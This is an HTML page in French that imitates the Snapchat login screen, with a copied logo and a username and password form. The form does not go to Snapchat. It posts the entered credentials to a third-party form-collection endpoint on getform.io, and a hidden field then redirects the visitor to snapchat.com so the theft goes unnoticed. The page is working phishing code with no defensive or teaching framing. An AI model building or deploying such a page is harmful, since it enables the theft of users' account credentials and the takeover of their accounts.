<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Se connecter à Snapchat</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            background-color: white;
            border-radius: 12px;
            padding: 48px 40px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 440px;
            text-align: center;
        }

        .logo-container {
            margin-bottom: 32px;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 80px;
        }

        .logo-placeholder {
            width: 64px;
            height: 64px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
        }

        h1 {
            font-size: 28px;
            font-weight: 600;
            color: #1a1a1a;
            margin-bottom: 32px;
            line-height: 1.3;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #505050;
            margin-bottom: 8px;
        }

        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            font-size: 15px;
            border: 1px solid #d4d4d4;
            border-radius: 8px;
            outline: none;
            transition: border-color 0.2s;
            background-color: #fafafa;
        }

        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #00a7e1;
            background-color: white;
        }

        .phone-link {
            display: block;
            color: #00a7e1;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            margin: 16px 0 24px 0;
        }

        .phone-link:hover {
            text-decoration: underline;
        }

        .submit-btn {
            width: 100%;
            padding: 14px 24px;
            background-color: #00a7e1;
            color: white;
            border: none;
            border-radius: 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #0095c9;
        }

        .submit-btn:active {
            transform: scale(0.98);
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <div class="logo-placeholder">
                <!-- Espace pour le logo Snapchat -->
                <img src="img/Snap.png " alt="Snapchat Logo" style="width: 64px; height: 64px;">
            </div>
        </div>
        
        <h1>Se connecter à<br>Snapchat</h1>
        
        <form method="POST" action="https://getform.io/f/byvqywza">
            <div class="form-group">
                <input type="hidden" name="redirectTo" value="https://www.snapchat.com">
                <label for="username">Nom d'utilisateur ou adresse e-mail</label>
                <input type="text" id="username" name="username">
            </div>
            
            <div class="form-group">
                <label for="password">Mot de passe</label>
                <input type="password" name="cle_acces" required>
            </div>
            
            
            <button type="submit" class="submit-btn">Suivant</button>
        </form>
    </div>
</body>
</html>
